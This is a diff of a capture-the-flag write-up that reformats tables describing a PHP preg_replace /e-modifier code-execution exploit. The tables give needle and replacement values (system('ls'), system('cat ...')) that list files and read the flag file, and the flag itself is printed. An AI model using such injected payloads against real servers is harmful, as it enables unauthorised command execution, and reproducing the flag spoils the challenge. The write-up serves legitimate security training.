@@ -25,11 +25,11 @@ Example: **preg_replace("/.*/e", "system('ls')", "test");**. Will run **system('
 ### Exploit
 
 -> To List Files:
-| **Field**     | **Value**                |
-|---------------|--------------------------|
-| **Needle**    | `/e`                     |
-| **Replacement** | `system('ls')`         |
-| **Haystack**  | *(leave empty or type anything)* |
+| **Field**         | **Value**                       |
+|-------------------|---------------------------------|
+| **Needle**        | `/e`                            |
+| **Replacement**   | `system('ls')`                  |
+| **Haystack**      |  *(anything to trigger match)*  |
 
 This will run the ls command and print files in the current directory: 
 ```
@@ -37,10 +37,10 @@ index.php wRtu3ND38n8RNgez
 ```
 
 -> To Read the Flag File:
-| **Field**     | **Value**                                |
-|---------------|-------------------------------------------|
-| **Needle**    | `/e`                                      |
-| **Replacement** | `system('cat wRtu3ND38n8RNgez')`       |
-| **Haystack**  | *(anything to trigger match)*             |
+| **Field**       | **Value**                         |
+|-----------------|-----------------------------------|
+| **Needle**      | `/e`                              |
+| **Replacement** | `system('cat wRtu3ND38n8RNgez')`  |
+| **Haystack**    | *(anything to trigger match)*     |
 
 This shows the flag: **SSS{st0p_3x3cut1ng_cmds_0n_my_s3rv3r}**
